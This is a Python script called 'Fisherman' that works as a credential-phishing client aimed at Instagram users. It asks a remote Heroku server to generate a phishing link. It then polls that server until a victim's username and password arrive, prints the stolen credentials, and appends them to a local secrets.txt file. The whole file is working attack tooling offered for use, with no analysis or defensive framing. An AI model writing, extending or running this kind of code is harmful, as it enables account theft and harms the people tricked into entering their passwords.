import requests
import json
from time import sleep
import colors as c

print(f'{c.yl}Welcome to Fisherman.{c.rt}', end='\n\n')

URL = 'https://metafb.herokuapp.com'

def watch_link(data, delay=10):
    '''Keep checking for valid credentials after every 'delay' seconds.
    Once valid credentials are found, return.

    'data' should be a dictionacy with 'url' and 'key'.'''
    while True:
        response = requests.post(url = URL + '/extract', data = data)
        res = response.json()
        try:
            username = res['username']
            password = res['password']
            print(f'''
Credentials Found
=================
Username :{c.rd} {username} {c.rt}
Password :{c.yl} {password} {c.rt}
            ''')
            return res
        except KeyError:
            sleep(10)

def generate_new_link(site):
    if site == 'instagram':
        data = { 'site': 'instagram' }
    else:
        print(f'{c.rd}Unkown site: {site}{c.rt}')
        exit(1)
    response = requests.post(url = URL+'/generate', data = data)
    if not response:
        print(f'{c.rd}failed to generate link...{c.rt}')
    else:
        return response.json()


if __name__ == '__main__':

    y_or_n = input("Generate link for 'Instagram' [Y/n]: ")
    if y_or_n == 'n' or y_or_n == 'N':
        exit(0)
    data = generate_new_link('instagram')
    if data is not None:
        link = URL + '/' + data['url']
        key  = data['key']
        print(f'link -> {c.gr}{link}{c.rt}')
        print(f'key  -> {c.yl}{key}{c.rt}')
        credentials = watch_link(data)
        if credentials is not None:
            secret_file = 'secrets.txt'
            print(f'writing the credentials to {c.gr}"{secret_file}"{c.rt}')
            with open(secret_file, 'a') as f:
                f.write(credentials["username"])
                f.write('\n')
                f.write(credentials["password"])
                f.write('\n-----\n')
